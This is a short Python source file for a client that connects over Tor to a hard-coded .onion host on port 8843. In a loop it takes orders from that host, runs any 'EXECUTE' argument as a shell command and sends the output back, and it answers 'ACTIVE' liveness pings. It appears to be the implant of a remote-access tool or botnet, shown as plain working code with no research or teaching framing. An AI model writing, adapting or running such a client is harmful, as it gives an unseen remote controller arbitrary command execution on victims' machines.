from network import ClientSocket, Tor
import tasks


class Client:
	BUFFERSIZE = 1024

	def __init__(self):
		self.__tor = Tor()
		self.__sock = ClientSocket('mzdaxxejpx6yy47nifqvul44dfh6klhnmdsqmxakkrcabue2tjlb36ad.onion', 8843)

	"""
	Once the connection is established the client receives tasks,
	and responds with the corresponding output.
	"""
	def run(self):
		while True:
			# receive task
			task, args = self.__sock.receive(self.BUFFERSIZE)
			# evaluate output
			if task == 'EXECUTE':
				print('<args> = {}'.format(args))
				command = args[0]
				output = tasks.executeShell(command)
				self.__sock.send(output)
			elif task == 'ACTIVE':
				self.__sock.send('ACTIVE')
			else:
				self.__sock.send('Unknown command')


if __name__ == '__main__':
	client = Client()
	client.run()